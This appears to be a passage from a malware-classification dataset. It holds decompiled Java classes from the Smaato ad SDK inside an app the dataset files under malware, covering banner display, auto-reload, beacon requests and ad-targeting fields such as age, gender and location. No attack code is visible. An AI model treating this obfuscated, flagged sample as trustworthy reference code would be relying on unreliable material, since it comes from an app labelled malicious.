"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BannerStateListener.code","public interface BannerStateListener {   void a(  BaseView baseView);   void b(  BaseView baseView) throws ClosingLandingPageFailed ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BannerView.code","public class BannerView extends BaseView implements BannerViewInterface {   private boolean j;   private boolean k;   private int l;   private Runnable m;   public BannerView(  Context context,  final AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.j=true;     this.k=true;     this.l=60;     this.m=new Runnable(){       @Override public void run(){         new CrashReportTemplate<Void>(){           @Override public Void b() throws Exception {             BannerView.this.getBannerAnimatorHandler().removeCallbacks(BannerView.this.m);             BannerView.this.b();             if (BannerView.this.i()) {               BannerView.this.postDelayed(BannerView.this.m,BannerView.this.l * 1000);               return null;             }             return null;           }         } .c();       }     } ;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BannerView.this.d();         BannerView.this.a(attributeSet,0);         return null;       }     } .c();   }   public BannerView(  Context context,  final AttributeSet attributeSet){     super(context,attributeSet);     this.j=true;     this.k=true;     this.l=60;     this.m=new Runnable(){       @Override public void run(){         new CrashReportTemplate<Void>(){           @Override public Void b() throws Exception {             BannerView.this.getBannerAnimatorHandler().removeCallbacks(BannerView.this.m);             BannerView.this.b();             if (BannerView.this.i()) {               BannerView.this.postDelayed(BannerView.this.m,BannerView.this.l * 1000);               return null;             }             return null;           }         } .c();       }     } ;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BannerView.this.d();         BannerView.this.a(attributeSet,0);         return null;       }     } .c();   }   public BannerView(  Context context){     super(context);     this.j=true;     this.k=true;     this.l=60;     this.m=new Runnable(){       @Override public void run(){         new CrashReportTemplate<Void>(){           @Override public Void b() throws Exception {             BannerView.this.getBannerAnimatorHandler().removeCallbacks(BannerView.this.m);             BannerView.this.b();             if (BannerView.this.i()) {               BannerView.this.postDelayed(BannerView.this.m,BannerView.this.l * 1000);               return null;             }             return null;           }         } .c();       }     } ;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BannerView.this.d();         return null;       }     } .c();   }   public boolean i(){     return this.j;   }   @Override public void a() throws UnableToPauseAutoReload {     try {       Debugger.a(new Object(){       } );       this.j=false;       getBannerAnimatorHandler().removeCallbacksAndMessages(null);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToPauseAutoReload(e2);     }   }   public void j() throws UnableToResumeAutoReload {     try {       Debugger.a(new Object(){       } );       getBannerAnimatorHandler().removeCallbacksAndMessages(null);       getBannerAnimatorHandler().postDelayed(this.m,this.l * 1000);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToResumeAutoReload(e2);     }   }   public void setAutoReloadEnabled(  final boolean z){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new Object(){         } );         BannerView.this.j=z;         if (BannerView.this.j) {           BannerView.this.j();         }  else {           BannerView.this.a();         }         BannerView.this.k=BannerView.this.j;         return null;       }     } .c();   }   public final int getAutoReloadFrequency(){     return new CrashReportTemplate<Integer>(){       @Override public Integer b() throws Exception {         return Integer.valueOf(BannerView.this.l);       }     } .c().intValue();   }   public final void setAutoReloadFrequency(  final int i){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (i < 10 || i > 600) {           BannerView.this.l=60;           return null;         }         BannerView.this.l=i;         return null;       }     } .c();   }   @Override public final void onWindowFocusChanged(  final boolean z){     super.onWindowFocusChanged(z);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (z && BannerView.this.k) {           BannerView.this.j();           return null;         }         BannerView.this.a();         return null;       }     } .c();   }   @Override public void onAttachedToWindow(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (BannerView.this.k) {           BannerView.this.j();           return null;         }         return null;       }     } .c();     super.onAttachedToWindow();   }   public boolean a(  AttributeSet attributeSet,  int i) throws LoadingAttributesFromLayoutFailed {     try {       if (isInEditMode() || i >= attributeSet.getAttributeCount()) {         return true;       }       a(attributeSet.getAttributeName(i),attributeSet.getAttributeValue(i));       return a(attributeSet,i + 1);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new LoadingAttributesFromLayoutFailed(e2);     }   }   private void a(  String str,  String str2) throws BannerViewXmlAttributeFailed {     try {       String trim=str2.trim();       if (str.equalsIgnoreCase(""publisherId"")) {         getAdSettings().a(Integer.parseInt(trim));         return;       }       if (str.equalsIgnoreCase(""adSpaceId"")) {         getAdSettings().b(Integer.parseInt(trim));         return;       }       if (str.equalsIgnoreCase(""autoReloadEnabled"")) {         setAutoReloadEnabled(Boolean.parseBoolean(trim));         return;       }       if (str.equalsIgnoreCase(""autoReloadFrequency"")) {         setAutoReloadFrequency(Integer.parseInt(trim));         return;       }       if (str.equalsIgnoreCase(""AdType"")) {         getAdSettings().a(AdType.a(trim));         return;       }       if (str.equalsIgnoreCase(""backgroundColor"")) {         setBackgroundColor(Color.parseColor(""#"" + trim));         return;       }       if (str.equalsIgnoreCase(""locationUpdateEnabled"")) {         this.b.setLocationUpdateEnabled(Boolean.parseBoolean(trim));         return;       }       if (str.equalsIgnoreCase(""keywordList"")) {         getUserSettings().a(trim);         return;       }       if (str.equalsIgnoreCase(""searchQuery"")) {         getUserSettings().b(trim);         return;       }       if (str.equalsIgnoreCase(""age"")) {         getUserSettings().a(Integer.parseInt(trim));         return;       }       if (str.equalsIgnoreCase(""gender"")) {         getUserSettings().a(UserSettings.Gender.a(trim));         return;       }       if (str.equalsIgnoreCase(""region"")) {         getUserSettings().c(trim);         return;       }       if (str.equalsIgnoreCase(""country"")) {         getUserSettings().d(trim);         return;       }       if (str.equalsIgnoreCase(""city"")) {         getUserSettings().e(trim);         return;       }       if (str.equalsIgnoreCase(""zip"")) {         getUserSettings().f(trim);         return;       }       if (str.equalsIgnoreCase(""latitude"")) {         getUserSettings().a(Double.parseDouble(trim));         return;       }       if (str.equalsIgnoreCase(""longitude"")) {         getUserSettings().b(Double.parseDouble(trim));         return;       }       if (str.equalsIgnoreCase(""userProfileEnabled"")) {         getUserSettings().a(Boolean.parseBoolean(trim));         return;       }       if (str.equalsIgnoreCase(""adDimension"")) {         getAdSettings().a(AdDimension.a(trim));         return;       }       if (str.equalsIgnoreCase(""bannerWidth"")) {         getAdSettings().c(Integer.parseInt(trim));         return;       }       if (str.equalsIgnoreCase(""bannerHeight"")) {         getAdSettings().d(Integer.parseInt(trim));       }  else       if (str.equalsIgnoreCase(""loadNewBanner"") && Boolean.parseBoolean(trim)) {         b();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BannerViewXmlAttributeFailed(e2);     }   }   @Override public final void onDetachedFromWindow(){     super.onDetachedFromWindow();     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BannerView.this.a();         return null;       }     } .c();   }   @Override public Handler getBannerAnimatorHandler(){     if (this.g == null) {       setBannerAnimatorHandler(new BannerHandler(this,this,null));     }     return this.g;   } public class BannerHandler extends Handler {     private WeakReference<BaseView> b;     private BaseView c;     private BannerHandler(    BaseView baseView){       this.b=null;       this.c=baseView;     }     BannerHandler(    BannerView bannerView,    BaseView baseView,    BannerHandler bannerHandler){       this(baseView);     }     protected WeakReference<BaseView> a(){       if (this.b == null) {         this.b=new WeakReference<>(this.c);       }       return this.b;     }     @Override public void handleMessage(    final Message message){       super.handleMessage(message);       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           BaseView baseView=BannerHandler.this.a().get();           if (baseView != null) {             if (message.what == 101) {               baseView.getBannerState().b();               BannerAnimator.a().a(message.arg1,message.arg2,BannerView.this.getCurrentPackage(),baseView,BannerView.this.h);               BannerView.this.a();               BannerMeasurements.a().e();               BannerView.this.a();             }  else             if (message.what == 102) {               if (baseView.getCurrentPackage().e()) {                 baseView.getBannerState().d();               }  else {                 baseView.getBannerState().c();               }               BannerView.this.j();             }  else             if (message.what == 103) {               Log.e(getClass().getCanonicalName(),""resize"");               BannerView.this.getCurrentPackage().c().setLayoutParams(new FrameLayout.LayoutParams(message.arg1,message.arg2));               BannerView.this.getCurrentPackage().c().requestLayout();             }  else             if (message.what == 107) {               BannerAnimator.a().a(true);               baseView.getBannerState().d();             }           }           return null;         }       } .c();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BannerViewInterface.code","interface BannerViewInterface extends BaseViewInterface { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BaseInterface.code","public interface BaseInterface {   void b();   boolean c();   AdSettings getAdSettings();   UserSettings getUserSettings();   void setAdSettings(  AdSettings adSettings);   void setLocationUpdateEnabled(  boolean z);   void setUserSettings(  UserSettings userSettings); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BaseView.code","public abstract class BaseView extends RelativeLayout implements BaseViewInterface {   protected BannerStateListener a;   protected AdDownloaderInterface b;   protected BannerState c;   protected LoadingState d;   protected AbstractBannerPackage e;   protected AbstractBannerPackage f;   protected Handler g;   protected float h;   protected int i;   private boolean j;   private boolean k;   public abstract Handler getBannerAnimatorHandler();   public BaseView(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.h=0.0f;     this.i=-1;     this.j=true;     this.k=true;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.d();         return null;       }     } .c();   }   public BaseView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.h=0.0f;     this.i=-1;     this.j=true;     this.k=true;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.d();         return null;       }     } .c();   }   public BaseView(  Context context){     super(context);     this.h=0.0f;     this.i=-1;     this.j=true;     this.k=true;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.d();         return null;       }     } .c();   }   public void d() throws BannerViewInstantiationException {     try {       Debugger.a(new Object(){       } );       if (isInEditMode()) {         i();         return;       }       new VersionVerifier().execute(new Void[0]);       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)getContext().getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       this.h=displayMetrics.density;       setDescendantFocusability(262144);       setFocusable(true);       RequestsBuilder.a().a(new WebView(getContext()).getSettings().getUserAgentString());       UserSettings userSettings=getUserSettings();       AdSettings adSettings=getAdSettings();       setAdDownloader(DefaultFactory.a().a(getContext()));       setUserSettings(userSettings);       setAdSettings(adSettings);       a(new AdListenerImpl(this,null));       a(new BannerState());       setLoadingStateMachine(new LoadingState());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BannerViewInstantiationException(e2);     }   }   private void i() throws EditModeFailed {     try {       setBackgroundColor(-7829368);       TextView textView=new TextView(getContext());       textView.setText(""Soma banner view"");       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);       layoutParams.addRule(13);       textView.setLayoutParams(layoutParams);       addView(textView);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new EditModeFailed(e2);     }   }   public final BannerState getBannerState(){     return this.c;   }   @Override public final void setBannerStateListener(  BannerStateListener bannerStateListener){     this.a=bannerStateListener;   }   public final BannerStateListener getBannerStateListener(){     return this.a;   }   @Override public final void a(  final AdListenerInterface adListenerInterface){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.getAdDownloader().a(adListenerInterface);         return null;       }     } .c();   }   @Override public final boolean b(  final AdListenerInterface adListenerInterface){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         return Boolean.valueOf(BaseView.this.getAdDownloader().b(adListenerInterface));       }     } .c().booleanValue();   } public class AnonymousClass7 extends CrashReportTemplate<Void> {     AnonymousClass7(){     }     @Override public Void b() throws Exception {       if (BannerMeasurements.a().b()) {         if (Controller.a().d() && BaseView.this.getBannerState().a() != BannerState.State.STATE_BANNEREXPANDED) {           BaseView.this.d();           Controller.a().c();         }         new Thread(new Runnable(){           @Override public void run(){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (BaseView.this.getLoadingState().a()) {                   System.gc();                   return null;                 }                 return null;               }             } .c();           }         } ).start();       }       return null;     }   }   @Override public void b(){     new AnonymousClass7().c();   }   @Override public final void setLocationUpdateEnabled(  final boolean z){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.getAdDownloader().setLocationUpdateEnabled(z);         return null;       }     } .c();   }   @Override public final boolean c(){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         return Boolean.valueOf(BaseView.this.getAdDownloader().c());       }     } .c().booleanValue();   }   @Override public final AdSettings getAdSettings(){     return new CrashReportTemplate<AdSettings>(){       @Override public AdSettings b() throws Exception {         return BaseView.this.getAdDownloader().getAdSettings();       }     } .c();   }   @Override public final UserSettings getUserSettings(){     return new CrashReportTemplate<UserSettings>(){       @Override public UserSettings b() throws Exception {         return BaseView.this.getAdDownloader().getUserSettings();       }     } .c();   }   @Override public final void setUserSettings(  final UserSettings userSettings){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.getAdDownloader().setUserSettings(userSettings);         return null;       }     } .c();   }   @Override public final void setAdSettings(  final AdSettings adSettings){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView.this.getAdDownloader().setAdSettings(adSettings);         return null;       }     } .c();   }   public final LoadingState getLoadingState(){     return this.d;   }   public boolean e() throws BannerViewSwitchingViewsException {     try {       Debugger.a(new Object(){       } );       AbstractBannerPackage currentPackage=getCurrentPackage();       if (currentPackage != null) {         removeAllViews();         currentPackage.a();       }       setCurrentPackage(getNextPackage());       setNextPackage(null);       addView(getCurrentPackage().c());       if (hasWindowFocus()) {         f();       }  else {         a();       }       System.gc();       BannerMeasurements.a().a(this);       BannerAnimator.a().a(false);       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BannerViewSwitchingViewsException(e2);     }   }   public void a() throws UnableToPauseAutoReload {   }   public boolean f() throws BeaconLoadFailedException {     try {       ReceivedBannerInterface d=getCurrentPackage().d();       if (d == null || d.a() != BannerStatus.SUCCESS || d.e() == null || d.e().isEmpty()) {         return false;       }       new BeaconRequest().execute((String[])d.e().toArray(new String[0]));       this.k=true;       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BeaconLoadFailedException(e2);     }   }   protected void setLoadingStateMachine(  LoadingState loadingState) throws AddingLoadingStateToBannerViewFailedException {     try {       Debugger.a(new Object(){       } );       this.d=loadingState;       this.d.a(true);       this.d.a(new LoadingStateDelegateImp(this));     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AddingLoadingStateToBannerViewFailedException(e2);     }   }   public final AbstractBannerPackage getCurrentPackage(){     return this.e;   }   protected final void setCurrentPackage(  AbstractBannerPackage abstractBannerPackage){     this.e=abstractBannerPackage;   }   public final AbstractBannerPackage getNextPackage(){     return this.f;   }   public final void setNextPackage(  AbstractBannerPackage abstractBannerPackage){     this.f=abstractBannerPackage;   }   public final AdDownloaderInterface getAdDownloader() throws UnableToFindAdDownloader {     try {       if (this.b == null) {         setAdDownloader(DefaultFactory.a().a(getContext()));       }       return this.b;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToFindAdDownloader(e2);     }   }   protected final void setAdDownloader(  AdDownloaderInterface adDownloaderInterface){     this.b=adDownloaderInterface;   }   protected final void a(  BannerState bannerState) throws BannerStateInstantiationException {     try {       Debugger.a(new Object(){       } );       this.c=bannerState;       this.c.a(true);       this.c.a(new BannerStateDelegateImp(this));     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BannerStateInstantiationException(e2);     }   }   @Override public final void setBackgroundColor(  int i){     super.setBackgroundColor(i);     this.i=i;   }   public final int getBackgroundColor(){     return this.i;   }   public void setBannerAnimatorHandler(  Handler handler){     this.g=handler;   }   public void g() throws UnableToNotifyBannerIdle {     Debugger.a(new Object(){     } );     ProgressBar.a().a(true);   }   public final boolean h(){     return this.j;   }   public final void setScalingEnabled(  boolean z){     this.j=z;   }   @Override public void onDetachedFromWindow(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         ProgressBar.a().b();         return null;       }     } .c();     super.onDetachedFromWindow();   }   @Override public void onAttachedToWindow(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (!BaseView.this.k) {           BaseView.this.f();           return null;         }         return null;       }     } .c();     super.onAttachedToWindow();   } public class AdListenerImpl implements AdListenerInterface {     private AdListenerImpl(){     }     AdListenerImpl(    BaseView baseView,    AdListenerImpl adListenerImpl){       this();     }     @Override public final void a(    AdDownloaderInterface adDownloaderInterface,    ReceivedBannerInterface receivedBannerInterface) throws OnReceiveAdFailedException {       try {         Debugger.a(new Object(){         } );         if (receivedBannerInterface.a() == BannerStatus.ERROR) {           Debugger.a(new LogMessage(new StringBuilder().append(receivedBannerInterface.a()).toString(),""transitionErrorLoading"",1,DebugCategory.ERROR));           BaseView.this.getLoadingState().f();         }  else {           BaseView.this.setNextPackage(DefaultFactory.a().a(receivedBannerInterface.b()));           BaseView.this.getNextPackage().a(receivedBannerInterface);           BaseView.this.getLoadingState().b();         }         BaseView.this.k=false;       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new OnReceiveAdFailedException(e2);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BaseViewInterface.code","public interface BaseViewInterface extends StandardPublisherMethods {   void setBannerStateListener(  BannerStateListener bannerStateListener); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BuildConfig.code","public final class BuildConfig {   public static final boolean DEBUG=true; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\color.code","public static final class color {   public static int common_action_bar_splitter=dev.camera360.collage.R.layout.gadget_dialog;   public static int common_signin_btn_dark_text_default=dev.camera360.collage.R.layout.bookmark_grid_dialog;   public static int common_signin_btn_dark_text_disabled=dev.camera360.collage.R.layout.brush_chooser;   public static int common_signin_btn_dark_text_focused=dev.camera360.collage.R.layout.christmas_dialog;   public static int common_signin_btn_dark_text_pressed=dev.camera360.collage.R.layout.bookmark_item;   public static int common_signin_btn_default_background=dev.camera360.collage.R.layout.flickr_dialog;   public static int common_signin_btn_light_text_default=dev.camera360.collage.R.layout.comment_dialog;   public static int common_signin_btn_light_text_disabled=dev.camera360.collage.R.layout.custom_bar_notification;   public static int common_signin_btn_light_text_focused=dev.camera360.collage.R.layout.erase_chooser;   public static int common_signin_btn_light_text_pressed=dev.camera360.collage.R.layout.confirm_dialog3;   public static int common_signin_btn_text_dark=dev.camera360.collage.R.layout.gadget_dialog2;   public static int common_signin_btn_text_light=dev.camera360.collage.R.layout.gallery_dialog2; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\CrashReportTemplate.code","public abstract class CrashReportTemplate<T> {   public abstract T b() throws Exception ;   public T c(){     try {       return b();     }  catch (    Throwable th) {       Debugger.a(new LogMessage(""Error"",""Crash Detected"",2,DebugCategory.EXCEPTION,th));       Controller.a().b();       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\drawable.code","public static final class drawable {   public static int common_signin_btn_icon_dark=dev.camera360.collage.R.drawable.add_button;   public static int common_signin_btn_icon_disabled_dark=dev.camera360.collage.R.drawable.add_text_button;   public static int common_signin_btn_icon_disabled_focus_dark=dev.camera360.collage.R.drawable.addappicon_button;   public static int common_signin_btn_icon_disabled_focus_light=dev.camera360.collage.R.drawable.addbookmark_button;   public static int common_signin_btn_icon_disabled_light=dev.camera360.collage.R.drawable.addinstant;   public static int common_signin_btn_icon_focus_dark=dev.camera360.collage.R.drawable.addmoment_button;   public static int common_signin_btn_icon_focus_light=dev.camera360.collage.R.drawable.af_icon_list;   public static int common_signin_btn_icon_light=dev.camera360.collage.R.drawable.alert_dialog_icon;   public static int common_signin_btn_icon_normal_dark=dev.camera360.collage.R.drawable.antivirus;   public static int common_signin_btn_icon_normal_light=dev.camera360.collage.R.drawable.appicon_button;   public static int common_signin_btn_icon_pressed_dark=dev.camera360.collage.R.drawable.apply_button;   public static int common_signin_btn_icon_pressed_light=dev.camera360.collage.R.drawable.arrow_left_button;   public static int common_signin_btn_text_dark=dev.camera360.collage.R.drawable.arrow_left_normal;   public static int common_signin_btn_text_disabled_dark=dev.camera360.collage.R.drawable.arrow_left_pressed;   public static int common_signin_btn_text_disabled_focus_dark=dev.camera360.collage.R.drawable.arrow_right_button;   public static int common_signin_btn_text_disabled_focus_light=dev.camera360.collage.R.drawable.arrow_right_normal;   public static int common_signin_btn_text_disabled_light=dev.camera360.collage.R.drawable.arrow_right_pressed;   public static int common_signin_btn_text_focus_dark=dev.camera360.collage.R.drawable.back_button;   public static int common_signin_btn_text_focus_light=dev.camera360.collage.R.drawable.back_button2;   public static int common_signin_btn_text_light=dev.camera360.collage.R.drawable.back_draw_button;   public static int common_signin_btn_text_normal_dark=dev.camera360.collage.R.drawable.bestyoutube_icon;   public static int common_signin_btn_text_normal_light=dev.camera360.collage.R.drawable.bg_flat_grey_border;   public static int common_signin_btn_text_pressed_dark=dev.camera360.collage.R.drawable.bg_flight_gray_body;   public static int common_signin_btn_text_pressed_light=dev.camera360.collage.R.drawable.bg_flight_gray_bottom;   public static int ic_plusone_medium_off_client=dev.camera360.collage.R.drawable.bg_flight_gray_top;   public static int ic_plusone_small_off_client=dev.camera360.collage.R.drawable.bg_flight_white_body;   public static int ic_plusone_standard_off_client=dev.camera360.collage.R.drawable.bg_flight_white_bottom;   public static int ic_plusone_tall_off_client=dev.camera360.collage.R.drawable.bg_flight_white_top; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\FullScreenBanner.code","public class FullScreenBanner extends AbstractAlertView<BaseViewInterface> implements BannerStateListener {   private AlertDialog.Builder c;   private BannerStatus d;   private ReceivedBannerInterface e; class AnonymousClass1 extends CrashReportTemplate<Void> {     final FullScreenBanner a;     @Override public Void b() throws Exception {       this.a.c=new AlertDialog.Builder(this.a.b());       return null;     }   }   @Override protected void a() throws FullScreenBannerInstantiationException {     AdSettings adSettings;     try {       Debugger.a(new Object(){       } );       if (this.b == 0) {         adSettings=null;       }  else {         adSettings=((BaseViewInterface)this.b).getAdSettings();       }       this.b=new FullScreenView(b());       ((BaseViewInterface)this.b).a(f());       ((BaseViewInterface)this.b).setBannerStateListener(this);       if (adSettings != null) {         ((BaseViewInterface)this.b).setAdSettings(adSettings);       }       ((BaseViewInterface)this.b).getAdSettings().a(AdDimension.NOT_SET);       ((BaseViewInterface)this.b).getAdSettings().c(DeviceDataCollector.a().i());       ((BaseViewInterface)this.b).getAdSettings().d(DeviceDataCollector.a().j());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new FullScreenBannerInstantiationException(e2);     }   }   protected AdListenerInterface f(){     return new AdListenerImpl(this,null);   }   @Override public void e(){     super.e();     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (((BaseView)FullScreenBanner.this.b).getParent() != null) {           ((ViewGroup)((BaseView)FullScreenBanner.this.b).getParent()).removeView((BaseView)FullScreenBanner.this.b);           return null;         }         return null;       }     } .c();   }   @Override public void a(  BaseView baseView){   }   @Override public void b(  BaseView baseView) throws FullScreenBannerClosingLandingPageFailed {     try {       e();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new FullScreenBannerClosingLandingPageFailed(e2);     }   } public class AdListenerImpl implements AdListenerInterface {     private AdListenerImpl(){     }     AdListenerImpl(    FullScreenBanner fullScreenBanner,    AdListenerImpl adListenerImpl){       this();     }     @Override public final void a(    AdDownloaderInterface adDownloaderInterface,    ReceivedBannerInterface receivedBannerInterface) throws FullScreenBannerFailedToReceiveAd {       try {         Debugger.a(new Object(){         } );         if (receivedBannerInterface.a() == BannerStatus.ERROR) {           FullScreenBanner.this.d=receivedBannerInterface.a();           FullScreenBanner.this.e=null;         }  else {           FullScreenBanner.this.d=receivedBannerInterface.a();           FullScreenBanner.this.e=receivedBannerInterface;         }       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new FullScreenBannerFailedToReceiveAd(e2);       }     }   } public class FullScreenView extends BaseView {     protected FullScreenView(    Context context){       super(context);     }     @Override public void g() throws UnableToViewFullScreenBanner {       try {         if (FullScreenBanner.this.d != BannerStatus.ERROR && FullScreenBanner.this.e != null && FullScreenBanner.this.d() == null) {           super.g();           FullScreenBanner.this.c=new AlertDialog.Builder(getContext());           FullScreenBanner.this.c.setCancelable(false);           FullScreenBanner.this.c.setView((FullScreenView)FullScreenBanner.this.b);           FullScreenBanner.this.c.setNegativeButton(""Skip"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i){               new CrashReportTemplate<Void>(){                 @Override public Void b() throws Exception {                   if (FullScreenBanner.this.a != null) {                     FullScreenBanner.this.a.b();                   }                   FullScreenBanner.this.e();                   return null;                 }               } .c();             }           } );           if (FullScreenBanner.this.e.b() != null && (FullScreenBanner.this.e.b() == AdType.TEXT || FullScreenBanner.this.e.b() == AdType.IMAGE)) {             FullScreenBanner.this.c.setPositiveButton(""More Info"",new DialogInterface.OnClickListener(){               @Override public void onClick(              final DialogInterface dialogInterface,              int i){                 new CrashReportTemplate<Void>(){                   @Override public Void b() throws Exception {                     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(FullScreenBanner.this.e.d()));                     if (FullScreenBanner.this.a != null) {                       FullScreenBanner.this.a.a();                     }                     FullScreenView.this.getContext().startActivity(intent);                     dialogInterface.dismiss();                     return null;                   }                 } .c();               }             } );           }           if (FullScreenBanner.this.a != null) {             FullScreenBanner.this.a.c();           }           FullScreenBanner.this.a(FullScreenBanner.this.c.show());           f();           FullScreenBanner.this.d=BannerStatus.ERROR;         }       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new UnableToViewFullScreenBanner(e2);       }     }     @Override public Handler getBannerAnimatorHandler(){       if (this.g == null) {         setBannerAnimatorHandler(new BannerHandler(this,this,null));       }       return this.g;     } public class BannerHandler extends Handler {       private WeakReference<BaseView> b;       private BaseView c;       private BannerHandler(      BaseView baseView){         this.b=null;         this.c=baseView;       }       BannerHandler(      FullScreenView fullScreenView,      BaseView baseView,      BannerHandler bannerHandler){         this(baseView);       }       protected WeakReference<BaseView> a(){         if (this.b == null) {           this.b=new WeakReference<>(this.c);         }         return this.b;       }       @Override public void handleMessage(      final Message message){         super.handleMessage(message);         new CrashReportTemplate<Void>(){           @Override public Void b() throws Exception {             BaseView baseView=BannerHandler.this.a().get();             if (baseView != null) {               if (message.what == 101) {                 baseView.getBannerState().b();                 BannerAnimator.a().a(message.arg1,message.arg2,FullScreenView.this.getCurrentPackage(),baseView,FullScreenView.this.h);               }  else               if (message.what == 102) {                 baseView.getBannerState().c();               }  else               if (message.what == 107) {                 baseView.getBannerState().c();               }             }             return null;           }         } .c();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\FullScreenView.code","public class FullScreenView extends BaseView {   protected FullScreenView(  Context context){     super(context);   }   @Override public void g() throws UnableToViewFullScreenBanner {     try {       if (FullScreenBanner.this.d != BannerStatus.ERROR && FullScreenBanner.this.e != null && FullScreenBanner.this.d() == null) {         super.g();         FullScreenBanner.this.c=new AlertDialog.Builder(getContext());         FullScreenBanner.this.c.setCancelable(false);         FullScreenBanner.this.c.setView((FullScreenView)FullScreenBanner.this.b);         FullScreenBanner.this.c.setNegativeButton(""Skip"",new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialogInterface,          int i){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (FullScreenBanner.this.a != null) {                   FullScreenBanner.this.a.b();                 }                 FullScreenBanner.this.e();                 return null;               }             } .c();           }         } );         if (FullScreenBanner.this.e.b() != null && (FullScreenBanner.this.e.b() == AdType.TEXT || FullScreenBanner.this.e.b() == AdType.IMAGE)) {           FullScreenBanner.this.c.setPositiveButton(""More Info"",new DialogInterface.OnClickListener(){             @Override public void onClick(            final DialogInterface dialogInterface,            int i){               new CrashReportTemplate<Void>(){                 @Override public Void b() throws Exception {                   Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(FullScreenBanner.this.e.d()));                   if (FullScreenBanner.this.a != null) {                     FullScreenBanner.this.a.a();                   }                   FullScreenView.this.getContext().startActivity(intent);                   dialogInterface.dismiss();                   return null;                 }               } .c();             }           } );         }         if (FullScreenBanner.this.a != null) {           FullScreenBanner.this.a.c();         }         FullScreenBanner.this.a(FullScreenBanner.this.c.show());         f();         FullScreenBanner.this.d=BannerStatus.ERROR;       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToViewFullScreenBanner(e2);     }   }   @Override public Handler getBannerAnimatorHandler(){     if (this.g == null) {    